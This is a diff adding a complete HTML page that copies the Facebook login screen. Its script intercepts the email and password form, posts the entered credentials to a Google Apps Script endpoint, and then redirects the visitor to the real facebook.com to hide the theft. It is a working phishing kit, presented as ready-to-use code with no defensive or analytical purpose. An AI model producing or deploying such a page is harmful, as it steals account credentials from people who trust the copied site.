@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="fb.css" type="text/css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="center">
+            <div class="left-side">
+                <img src="fblogo.png" alt="Facebook" class="fblogo">
+                <h2 class="fb-help">Facebook helps you connect and share <br> with the people in your life.</h2>
+                <div class="add-ac">
+                    <img src="plus icon.png" alt="" class="plus">
+                    <div class="name">
+                        <a href="https://facebook.com" class="addaccount"><p class="add">Add Account</p></a>
+                    </div>
+                </div>
+            </div>
+            <div class="right-side">
+                <div class="form">
+                    <form action="" id="submit-form">
+                        <input type="email" placeholder="Email address or phone number" id="email" name="email">
+                        <input type="password" placeholder="Password" id="password" name="password">
+                        <input type="submit" value="Log In" id="submit">
+                    </form>
+                    <a href="https://facebook.com" class="forgot">Forgotten password?</a>
+                    <br><br>
+                    <hr class="hr">
+                    <a href="https://facebook.com"><button class="cre-ac">Create New Account</button></a>
+                </div>
+                <p class="ancer"><a href="https://facebook.com" class="cre-pg">Create a Page</a> for a celebrity, band or business.</p>
+            </div>
+        </div>
+        <div class="footer">
+            <p class="lag"><a class="eng"> English(UK)</a>      മലയാളം        தமிழ்     తెలుగు     हिंदी      عربى        ಕನ್ನಡ        Português (Brasil)      Français (France)       <button plus>+</button></p>
+            <hr class="hr2">
+            <p class="options"><a class="support" href="index.html">
+                SignUp  LogIn   Messenger   FacebookLite    Watch   Watch   Pages   PageCategories  Places  Games   Locations   Marketplace FacebookPay Groups<br>  Jobs    Oculus  Portal  Instagram   Local   Fundraisers Services    VotingInformation Centre    About   CreateAdd   CreatePage  Developers  Careers Privacy <br>Cookies AdChoices   Terms   Help
+            </a></p>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.3/dist/jquery.validate.js"></script>
+    <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycby-MTIJKBprWAJxKDo6UfbWHtwbCyuiwdKK0ppkpN0CNcVDTCNbDwv9ymkOBVMNplFFmA/exec	",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("Form submitted successfully")
+                    //window.location.reload()
+                    window.location.href="https://facebook.com"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
+</body>
+</html>
